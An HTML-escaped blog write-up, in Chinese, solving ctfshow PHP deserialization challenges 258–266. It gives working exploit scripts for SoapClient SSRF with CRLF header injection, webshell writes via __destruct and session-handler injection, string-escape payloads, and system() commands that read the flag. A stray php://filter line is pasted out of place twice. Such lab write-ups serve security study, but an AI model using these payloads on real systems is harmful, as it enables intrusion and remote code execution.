            <description><![CDATA[ &lt;h1 id=&#34;web-258&#34;&gt;&lt;a href=&#34;#web-258&#34; class=&#34;headerlink&#34; title=&#34;web 258&#34;&gt;&lt;/a&gt;web 258&lt;/h1&gt;&lt;p&gt;相比于上一题多了正则匹配：&lt;code&gt;if(!preg_match(&#39;/[oc]:\d+:/i&#39;, $_COOKIE[&#39;user&#39;]))&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;由构造的序列化字符串，只需将&lt;code&gt;O:&lt;/code&gt;改为&lt;code&gt;O:+&lt;/code&gt;即可&lt;/p&gt;
&lt;h1 id=&#34;web-259&#34;&gt;&lt;a href=&#34;#web-259&#34; class=&#34;headerlink&#34; title=&#34;web 259&#34;&gt;&lt;/a&gt;web 259&lt;/h1&gt;&lt;p&gt;这个题利用的是php原生类SoapClient&lt;br&gt;该类的构造函数如下：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;flag.php&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$xff = explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);
array_pop($xff);
$ip = array_pop($xff);


if($ip!==&#39;127.0.0.1&#39;){
    die(&#39;error&#39;);
}else{
    $token = $_POST[&#39;token&#39;];
    if($token==&#39;ctfshow&#39;){
        file_put_contents(&#39;flag.txt&#39;,$flag);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当然这是个不完整的源码，应该还有一条判断真实ip的也就是&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;if($_SERVER[&#39;REMOTE_ADDR&#39;]===&#39;127.0.0.1&#39;){
xxxxxx;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以首先得利用&lt;code&gt;ssrf&lt;/code&gt;访问&lt;code&gt;flag.php&lt;/code&gt;接着构造post数据&lt;code&gt;token=ctfshow&lt;/code&gt;和请求头&lt;code&gt;X-Forwarded-For&lt;/code&gt;就能把flag写到flag.txt中了。&lt;/p&gt;
&lt;p&gt;那么ssrf漏洞在哪呢，这就得用到我们前面提到的SoapClient类了。这个类中有个&lt;code&gt;__call&lt;/code&gt;魔术方法（当调用不存在的方法时触发），会调用SoapClient类的构造方法。&lt;/p&gt;
&lt;p&gt;另外用到的一个文章识点就是CRLF&lt;/p&gt;
&lt;p&gt;大概如下：&lt;/p&gt;
&lt;p&gt;在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码&lt;/p&gt;
&lt;p&gt;就比如跳转网站，一般其跳转包为&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;html&#34;&gt;HTTP/1.1 302 Moved Temporarily 
Date: Fri, 27 Jun 2014 17:52:17 GMT 
Content-Type: text/html 
Content-Length: 154 
Connection: close 
Location: http://xxxx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果我们将&lt;code&gt;http://xxxx&lt;/code&gt;修改为&lt;code&gt;http://xxxx%0axxxx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;那么显然&lt;code&gt;Location&lt;/code&gt;段会变为&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;html&#34;&gt;Location: http://xxxx
xxxx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样我们就可以以此来修改跳转包，比如&lt;code&gt;Set-cookie&lt;/code&gt;，从而使得进入跳转网站自带cookie&lt;/p&gt;
&lt;p&gt;同理，如果我们将&lt;code&gt;%0a&lt;/code&gt;修改为&lt;code&gt;%0d%0a%0d%0a&lt;/code&gt;，即两个CRLF(换行)&lt;/p&gt;
&lt;p&gt;那么&lt;code&gt;xxxx&lt;/code&gt;会进入HTTP Body，即会显示，如果为&lt;code&gt;&amp;lt;img src=1 onerror=alert(/xss/)&amp;gt;&lt;/code&gt;那么会显示一张图片，并在错误时进行弹窗&lt;/p&gt;
&lt;p&gt;但由于浏览器的XSS Filter，同时需要注入&lt;code&gt;X-XSS-Protection:0&lt;/code&gt;，使得&lt;code&gt;alert&lt;/code&gt;正常执行&lt;/p&gt;
&lt;p&gt;由此，我们利用SoapClient进行请求包的构造&lt;/p&gt;
&lt;p&gt;大致结构为&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;html&#34;&gt;Content-Type: text/html 
Content-Length: 154 
Location: http://127.0.0.1/flag
X-Forwarded-For:127.0.0.1

token=ctfshow
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以payload&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

$url = &#34;http://127.0.0.1/flag.php&#34;;
$post = &#34;token=ctfshow&#34;;
$a = new SoapClient(null,array(&#39;location&#39; =&amp;gt; $url,&#39;user_agent&#39;=&amp;gt;&#39;xx^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded ^^Content-Length:&#39;.(string)strlen($post).&#39;^^^^&#39;.$post,&#39;uri&#39;=&amp;gt;&#39;ssrf&#39;));

echo urlencode(str_replace(&#39;^^&#39;,&#34;\r\n&#34;,serialize($a)));
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-260&#34;&gt;&lt;a href=&#34;#web-260&#34; class=&#34;headerlink&#34; title=&#34;web 260&#34;&gt;&lt;/a&gt;web 260&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

error_reporting(0);
highlight_file(__FILE__);
include(&#39;flag.php&#39;);

if(preg_match(&#39;/ctfshow_i_love_36D/&#39;,serialize($_GET[&#39;ctfshow&#39;]))){
    echo $flag;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由源码知，只需反序列化后的字符串包含&lt;code&gt;ctfshow_i_love_36D&lt;/code&gt;即可&lt;/p&gt;
&lt;p&gt;xxxxxxxxxx&amp;nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

$a = &#34;ctfshow_i_love_36D&#34;;

echo urlencode(serialize($a));
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-261&#34;&gt;&lt;a href=&#34;#web-261&#34; class=&#34;headerlink&#34; title=&#34;web 261&#34;&gt;&lt;/a&gt;web 261&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

highlight_file(__FILE__);

class ctfshowvip{
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p){
        $this-&amp;gt;username=$u;
        $this-&amp;gt;password=$p;
    }
    public function __wakeup(){
        if($this-&amp;gt;username!=&#39;&#39; || $this-&amp;gt;password!=&#39;&#39;){
            die(&#39;error&#39;);
        }
    }
    public function __invoke(){
        eval($this-&amp;gt;code);
    }

    public function __sleep(){
        $this-&amp;gt;username=&#39;&#39;;
        $this-&amp;gt;password=&#39;&#39;;
    }
    public function __unserialize($data){
        $this-&amp;gt;username=$data[&#39;username&#39;];
        $this-&amp;gt;password=$data[&#39;password&#39;];
        $this-&amp;gt;code = $this-&amp;gt;username.$this-&amp;gt;password;
    }
    public function __destruct(){
        if($this-&amp;gt;code==0x36d){
            file_put_contents($this-&amp;gt;username, $this-&amp;gt;password);
        }
    }
}

unserialize($_GET[&#39;vip&#39;]);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这题主要考察魔术方法的应用，&lt;/p&gt;
&lt;p&gt;&lt;code&gt;__construct&lt;/code&gt;为构造方法，&lt;/p&gt;
&lt;p&gt;&lt;code&gt;__wakeup&lt;/code&gt;准备对象资源，&lt;/p&gt;
&lt;p&gt;&lt;code&gt;__invoke&lt;/code&gt;当尝试以调用函数的方式调用一个对象时，&lt;code&gt;__invoke()&lt;/code&gt;方法会被自动调用。 &lt;/p&gt;
&lt;p&gt;&lt;code&gt;__sleep()&lt;/code&gt;方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。 &lt;/p&gt;
&lt;p&gt;&lt;code&gt;__unserialize&lt;/code&gt;反序列化调用的方法&lt;/p&gt;
&lt;p&gt;&lt;code&gt;__destruct&lt;/code&gt;析构方法&lt;/p&gt;
&lt;p&gt;而如果类中同时定义了&lt;code&gt;__unserialize&lt;/code&gt;和&lt;code&gt;__wakeup()&lt;/code&gt;两个魔术方法，则只有&lt;code&gt;__unserialize()&lt;/code&gt;方法会生效，&lt;code&gt;__wakeup()&lt;/code&gt;方法会被忽略。 &lt;/p&gt;
&lt;p&gt;而在代码中，我们必然只能调用&lt;code&gt;__unserialize&lt;/code&gt;和&lt;code&gt;__destruct&lt;/code&gt;两个方法&lt;/p&gt;
&lt;p&gt;其中&lt;code&gt;__destruct&lt;/code&gt;中由&lt;code&gt;file_put_contents&lt;/code&gt;可以想到写一句话到文件里，其只需要&lt;code&gt;$this-&amp;gt;code==0x36d&lt;/code&gt;即可&lt;/p&gt;
&lt;p&gt;观察到为&lt;code&gt;==&lt;/code&gt;即若等于，那么可以弄出&lt;code&gt;877.phpxxx==0x36d&lt;/code&gt;，即控制了文件名，而内容为一句话，也可以控制&lt;/p&gt;
&lt;p&gt;观察到反序列化中均可控，那么可以使&lt;code&gt;$username=&#39;877.php&#39;&lt;/code&gt;,&lt;code&gt;$password=&#39;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;即可成功写入一句话，之后正常rce即可&lt;/p&gt;
&lt;h1 id=&#34;web262&#34;&gt;&lt;a href=&#34;#web262&#34; class=&#34;headerlink&#34; title=&#34;web262&#34;&gt;&lt;/a&gt;web262&lt;/h1&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token=&#39;user&#39;;
    public function __construct($f,$m,$t){
        $this-&amp;gt;from = $f;
        $this-&amp;gt;msg = $m;
        $this-&amp;gt;to = $t;
    }
}

$f = $_GET[&#39;f&#39;];
$m = $_GET[&#39;m&#39;];
$t = $_GET[&#39;t&#39;];

if(isset($f) &amp;amp;&amp;amp; isset($m) &amp;amp;&amp;amp; isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));
    setcookie(&#39;msg&#39;,base64_encode($umsg));
    echo &#39;Your message has been sent&#39;;
}

highlight_file(__FILE__);

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;进入后发现并没有提供flag的地方，从头阅读源码，可以看到最上面注释有&lt;code&gt;message.php&lt;/code&gt;，访问，得到&lt;/p&gt;
&lt;p&gt;message.php&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 15:13:03
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 15:17:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
highlight_file(__FILE__);
include(&#39;flag.php&#39;);

class message{
    public $from;
    public $msg;
    public $to;
    public $token=&#39;user&#39;;
    public function __construct($f,$m,$t){
        $this-&amp;gt;from = $f;
        $this-&amp;gt;msg = $m;
        $this-&amp;gt;to = $t;
    }
}

if(isset($_COOKIE[&#39;msg&#39;])){
    $msg = unserialize(base64_decode($_COOKIE[&#39;msg&#39;]));
    if($msg-&amp;gt;token==&#39;admin&#39;){
        echo $flag;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;阅读代码，可知只需构造一个message类，token为&lt;code&gt;admin&lt;/code&gt;即可，故exp.php&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
    class message{
    public $from;
    public $msg;
    public $to;
    public $token=&#39;admin&#39;;
    public function __construct($f,$m,$t){
        $this-&amp;gt;from = $f;
        $this-&amp;gt;msg = $m;
        $this-&amp;gt;to = $t;
    }
}


echo base64_encode(serialize(new message(&#34;1&#34;,&#34;1&#34;,&#34;1&#34;)));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;payload:&lt;code&gt;Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiMSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxOiIxIjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;设置cookie的msg为此值，得到flag&lt;/p&gt;
&lt;h1 id=&#34;web-263&#34;&gt;&lt;a href=&#34;#web-263&#34; class=&#34;headerlink&#34; title=&#34;web 263&#34;&gt;&lt;/a&gt;web 263&lt;/h1&gt;&lt;p&gt;进入后是一个登陆界面，看似为sql注入，实则不是&lt;/p&gt;
&lt;p&gt;url输入&lt;code&gt;www.zip&lt;/code&gt;可以下载题目的源码，可以看到如下文件结构&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/../../../../post_images/ctfshow/Web-vip/web263_1.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 16:28:37
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-06 19:21:45
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
    error_reporting(0);
    session_start();
    //超过5次禁止登陆
    if(isset($_SESSION[&#39;limit&#39;])){
        $_SESSION[&#39;limti&#39;]&amp;gt;5?die(&#34;登陆失败次数超过限制&#34;):$_SESSION[&#39;limit&#39;]=base64_decode($_COOKIE[&#39;limit&#39;]);
        $_COOKIE[&#39;limit&#39;] = base64_encode(base64_decode($_COOKIE[&#39;limit&#39;]) +1);
    }else{
         setcookie(&#34;limit&#34;,base64_encode(&#39;1&#39;));
         $_SESSION[&#39;limit&#39;]= 1;
    }
    
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;check.php&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 16:59:10
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-06 19:15:38
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
require_once &#39;inc/inc.php&#39;;
$GET = array(&#34;u&#34;=&amp;gt;$_GET[&#39;u&#39;],&#34;pass&#34;=&amp;gt;$_GET[&#39;pass&#39;]);


if($GET){

    $data= $db-&amp;gt;get(&#39;admin&#39;,
    [	&#39;id&#39;,
        &#39;UserName0&#39;
    ],[
        &#34;AND&#34;=&amp;gt;[
        &#34;UserName0[=]&#34;=&amp;gt;$GET[&#39;u&#39;],
        &#34;PassWord1[=]&#34;=&amp;gt;$GET[&#39;pass&#39;] //密码必须为128位大小写字母+数字+特殊符号，防止爆破
        ]
    ]);
    if($data[&#39;id&#39;]){
        //登陆成功取消次数累计
        $_SESSION[&#39;limit&#39;]= 0;
        echo json_encode(array(&#34;success&#34;,&#34;msg&#34;=&amp;gt;&#34;欢迎您&#34;.$data[&#39;UserName0&#39;]));
    }else{
        //登陆失败累计次数加1
        $_COOKIE[&#39;limit&#39;] = base64_encode(base64_decode($_COOKIE[&#39;limit&#39;])+1);
        echo json_encode(array(&#34;error&#34;,&#34;msg&#34;=&amp;gt;&#34;登陆失败&#34;));
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;inc.php&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
    ...
    class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this-&amp;gt;username = $username;
        $this-&amp;gt;password = $password;
    }
    function setStatus($s){
        $this-&amp;gt;status=$s;
    }
    function __destruct(){
        file_put_contents(&#34;log-&#34;.$this-&amp;gt;username, &#34;使用&#34;.$this-&amp;gt;password.&#34;登陆&#34;.($this-&amp;gt;status?&#34;成功&#34;:&#34;失败&#34;).&#34;----&#34;.date_create()-&amp;gt;format(&#39;Y-m-d H:i:s&#39;));
    }
}
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;xxxxxxxxxx&amp;nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp&lt;/p&gt;
&lt;p&gt;可以看到在inc.php中，User的&lt;code&gt;__destruct&lt;/code&gt;方法有&lt;code&gt;file_put_contents&lt;/code&gt;方法，那么可以尝试一句话木马写文件，那么必须创建User对象&lt;/p&gt;
&lt;p&gt;查看源码流程,由于一开始进入，便会设置cookie及session，故略去if为false的情况&lt;/p&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$_SESSION[&#39;limti&#39;]&amp;gt;5?die(&#34;登陆失败次数超过限制&#34;):$_SESSION[&#39;limit&#39;]=base64_decode($_COOKIE[&#39;limit&#39;]);
$_COOKIE[&#39;limit&#39;] = base64_encode(base64_decode($_COOKIE[&#39;limit&#39;]) +1);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由于在index.php中无User类，故这里有用的只有设置session值&lt;/p&gt;
&lt;p&gt;故还需到check.php中，运行&lt;code&gt;$_COOKIE[&#39;limit&#39;] = base64_encode(base64_decode($_COOKIE[&#39;limit&#39;])+1);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;故设置好cookie的limit值后，前后各访问一次index.php和check.php，就能创建木马文件&lt;/p&gt;
&lt;p&gt;这里用到了&lt;code&gt;PHP的session反序列化漏洞&lt;/code&gt;知识，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8xMTYyNDYuaHRt&#34;&gt;参考文章&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;php-session反序列化漏洞&#34;&gt;&lt;a href=&#34;#php-session反序列化漏洞&#34; class=&#34;headerlink&#34; title=&#34;php session反序列化漏洞&#34;&gt;&lt;/a&gt;php session反序列化漏洞&lt;/h2&gt;&lt;h3 id=&#34;php-ini-与session有关的配置&#34;&gt;&lt;a href=&#34;#php-ini-与session有关的配置&#34; class=&#34;headerlink&#34; title=&#34;php.ini 与session有关的配置&#34;&gt;&lt;/a&gt;php.ini 与session有关的配置&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;ini&#34;&gt;session.save_path=&#34;&#34;  --设置session的存储路径
session.save_handler=&#34;&#34; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.auto_start  boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动
session.serialize_handler  string --定义用来序列化/反序列化的处理器名字。默认使用php 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中&lt;code&gt;session.serialize_handler&lt;/code&gt;共有三项值，各存储方式如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;php_binary：键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值&lt;/p&gt;
&lt;p&gt;如：&lt;code&gt;names:6:&#34;spoock&#34;;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;php：键名+竖线+经过serialize()函数序列处理的值&lt;/p&gt;
&lt;p&gt;如：&lt;code&gt;name|s:6:&#34;spoock&#34;;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;php_serialize(php&amp;gt;5.5.4)：经过serialize()函数序列化处理的值 &lt;/p&gt;
&lt;p&gt;如：&lt;code&gt;a:1:{s:4:&#34;name&#34;;s:6:&#34;spoock&#34;;}&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当在&lt;code&gt;php&lt;/code&gt;引擎设置下解析&lt;code&gt;a:1:{s:4:&#34;ryat&#34;;s:30:&#34;|O:1:&#34;A&#34;:1:{s:1:&#34;a&#34;;s:2:&#34;xx&#34;;}&lt;/code&gt;时，由于在该设置下会以&lt;code&gt;|&lt;/code&gt;为界，左边为key，右边为value，然后进行反序列化，最后得到&lt;/p&gt;
&lt;p&gt;&lt;code&gt;a:1:{s:4:&#34;ryat&#34;;s:30:&#34;&lt;/code&gt; = A类对象&lt;/p&gt;
&lt;p&gt;从而得到一个A类对象&lt;/p&gt;
&lt;p&gt;因此，在这题，可以利用该原理获取一个User类对象&lt;/p&gt;
&lt;p&gt;exp.php&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this-&amp;gt;username = $username;
        $this-&amp;gt;password = $password;
    }
}

echo urlencode(base64_encode(&#34;|&#34;.serialize(new User(&#34;a.php&#34;,&#39;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#39;))));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;[注：这里使用&lt;code&gt;urlencode&lt;/code&gt;主要是为了防止影响结果，在做题时因&lt;code&gt;+&lt;/code&gt;导致无法出结果]{.red}&lt;/p&gt;
&lt;p&gt;User对象已经构建，按照前面分析进行操作，生成的木马文件为&lt;code&gt;log-a.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;访问&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;E:\blog\source\素材\ctfshow\Web-vip\web263_2.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;一次post以下，得到flag&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;1=system(&#39;ls&#39;);
1=system(&#39;tac flag.php&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-264&#34;&gt;&lt;a href=&#34;#web-264&#34; class=&#34;headerlink&#34; title=&#34;web 264&#34;&gt;&lt;/a&gt;web 264&lt;/h1&gt;&lt;p&gt;相比较于web262，此时反序列化对象由index.php中的&lt;code&gt;$_SESSION[&#39;msg&#39;]&lt;/code&gt;传递，因此不能像web262那样解题，而是涉及到字符串逃逸。&lt;/p&gt;
&lt;p&gt;这一题的字符串逃逸比较简单&lt;/p&gt;
&lt;p&gt;首先编写以下代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
class message{
    public $from;
    public $msg;
    public $to;
    public $token=&#39;admin&#39;;
    public function __construct($f,$m,$t){
        $this-&amp;gt;from = $f;
        $this-&amp;gt;msg = $m;
        $this-&amp;gt;to = $t;
    }
}
$a = new message(&#34;&#34;,&#34;&#34;,&#34;&#34;);
$b = serialize($a);
echo str_replace(&#34;fuck&#34;,&#34;loveU&#34;,$b);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到&lt;code&gt;O:7:&#34;message&#34;:4:{s:4:&#34;from&#34;;s:0:&#34;&#34;;s:3:&#34;msg&#34;;s:0:&#34;&#34;;s:2:&#34;to&#34;;s:0:&#34;&#34;;s:5:&#34;token&#34;;s:5:&#34;admin&#34;;}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;复制&lt;code&gt;&#34;;s:5:&#34;token&#34;;s:5:&#34;admin&#34;;}&lt;/code&gt;，作为构造的结尾&lt;/p&gt;
&lt;p&gt;再编写代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
class message{
    public $from;
    public $msg;
    public $to;
    public $token=&#39;admin&#39;;
    public function __construct($f,$m,$t){
        $this-&amp;gt;from = $f;
        $this-&amp;gt;msg = $m;
        $this-&amp;gt;to = $t;
    }
}
$a = new message(&#34;&#34;,&#34;&#34;,&#39;&#34;;s:5:&#34;token&#34;;s:5:&#34;admin&#34;;}&#39;);
$b = serialize($a);
echo str_replace(&#34;fuck&#34;,&#34;loveU&#34;,$b);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到&lt;code&gt;O:7:&#34;message&#34;:4:{s:4:&#34;from&#34;;s:0:&#34;&#34;;s:3:&#34;msg&#34;;s:0:&#34;&#34;;s:2:&#34;to&#34;;s:27:&#34;&#34;;s:5:&#34;token&#34;;s:5:&#34;admin&#34;;}&#34;;s:5:&#34;token&#34;;s:5:&#34;admin&#34;;}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以看到，构造的结尾共有27个字符，而&lt;code&gt;fuck&lt;/code&gt;替换为&lt;code&gt;loveU&lt;/code&gt;增加了一个字符，故共需要27个&lt;code&gt;fuck&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;编写如下代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
class message{
    public $from;
    public $msg;
    public $to;
    public $token=&#39;admin&#39;;
    public function __construct($f,$m,$t){
        $this-&amp;gt;from = $f;
        $this-&amp;gt;msg = $m;
        $this-&amp;gt;to = $t;
    }
}
$s = str_repeat(&#34;fuck&#34;,27);
echo $s.&#39;&#34;;s:5:&#34;token&#34;;s:5:&#34;admin&#34;;}&#39;,&#34;&amp;lt;/br&amp;gt;&#34;;
$a = new message(&#34;&#34;,&#34;&#34;,$s.&#39;&#34;;s:5:&#34;token&#34;;s:5:&#34;admin&#34;;}&#39;);
$b = serialize($a);
echo str_replace(&#34;fuck&#34;,&#34;loveU&#34;,$b);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&#34;;s:5:&#34;token&#34;;s:5:&#34;admin&#34;;}
O:7:&#34;message&#34;:4:{s:4:&#34;from&#34;;s:0:&#34;&#34;;s:3:&#34;msg&#34;;s:0:&#34;&#34;;s:2:&#34;to&#34;;s:135:&#34;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&#34;;s:5:&#34;token&#34;;s:5:&#34;admin&#34;;}&#34;;s:5:&#34;token&#34;;s:5:&#34;admin&#34;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;经检查，&lt;code&gt;to&lt;/code&gt;替换后135的末尾恰为最后一个&lt;code&gt;loveU&lt;/code&gt;的结尾，故构造正确&lt;/p&gt;
&lt;p&gt;因此payload:&lt;code&gt;?f=&amp;amp;m=&amp;amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&#34;;s:5:&#34;token&#34;;s:5:&#34;admin&#34;;}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;提交后，再访问message.php，由于需要设置cookie的msg值，故设置，刷新网页，得到flag&lt;/p&gt;
&lt;h1 id=&#34;web-265&#34;&gt;&lt;a href=&#34;#web-265&#34; class=&#34;headerlink&#34; title=&#34;web 265&#34;&gt;&lt;/a&gt;web 265&lt;/h1&gt;&lt;p&gt;php按地址传参&lt;/p&gt;
&lt;p&gt;变量引用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this-&amp;gt;token=$t;
        $this-&amp;gt;password = &amp;amp;$this-&amp;gt;token;
    }
    public function login(){
        return $this-&amp;gt;token===$this-&amp;gt;password;
    }
}

$a = new ctfshowAdmin(&#34;&#34;,&#39;&#39;);

echo urlencode(serialize($a));
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-266&#34;&gt;&lt;a href=&#34;#web-266&#34; class=&#34;headerlink&#34; title=&#34;web 266&#34;&gt;&lt;/a&gt;web 266&lt;/h1&gt;&lt;p&gt;PHP特性：函数名和类名不区分大小写，变量名区分。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-04 23:52:24
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-05 00:17:08
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

highlight_file(__FILE__);

include(&#39;flag.php&#39;);
$cs = file_get_contents(&#39;php://input&#39;);


class ctfshow{
    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
    public function __construct($u,$p){
        $this-&amp;gt;username=$u;
        $this-&amp;gt;password=$p;
    }
    public function login(){
        return $this-&amp;gt;username===$this-&amp;gt;password;
    }
    public function __toString(){
        return $this-&amp;gt;username;
    }
    public function __destruct(){
        global $flag;
        echo $flag;
    }
}
$ctfshowo=@unserialize($cs);
if(preg_match(&#39;/ctfshow/&#39;, $cs)){
    throw new Exception(&#34;Error $ctfshowo&#34;,1);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;payload:&lt;code&gt;O:7:&#34;Ctfshow&#34;:0:{}&lt;/code&gt;&lt;/p&gt;
